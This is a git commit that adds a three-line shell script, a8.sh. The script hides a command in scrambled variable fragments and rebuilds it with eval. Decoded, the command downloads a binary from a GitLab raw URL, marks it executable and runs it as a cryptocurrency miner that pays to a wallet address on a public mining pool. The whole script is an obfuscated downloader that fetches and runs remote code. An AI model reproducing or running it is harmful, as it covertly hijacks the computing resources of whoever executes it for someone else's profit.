80d0ff7ca70b6e225bf724fd49ec9b8b8daf5ad8
chikahusarii <85166601+chikahusarii@users.noreply.github.com>
2022-09-16 19:20:43 +0700

    Add files via upload

---
+++ a8.sh
@@ -0,0 +1,3 @@
+z="
+";Kz='/-/r';Uz='nbtc';oz='Pbu1';Iz='eng/';az='ol e';Xz='Etch';Mz='ain/';mz='GT2h';ez='eabl';rz='8Yqe';bz='tcha';Jz='nega';Cz='ps:/';Tz='/coi';iz='-use';Lz='aw/m';sz='gfYM';Ez='lab.';Gz='asia';Nz='coin';Wz='oin ';tz='.W1';Pz='&& c';dz='nmin';nz='9iXX';Bz=' htt';Qz='hmod';Yz='ash ';pz='p9bg';Zz='--po';Sz='&& .';fz='e.co';jz='r TR';Rz=' +x ';hz='33 -';Oz='btc ';cz='sh.u';Vz=' --c';Hz='pbon';gz='m:33';Dz='/git';lz='bwEf';Az='wget';Fz='com/';kz='X:TB';qz='bjKK';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Nz$Oz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$oz$pz$qz$rz$sz$tz"
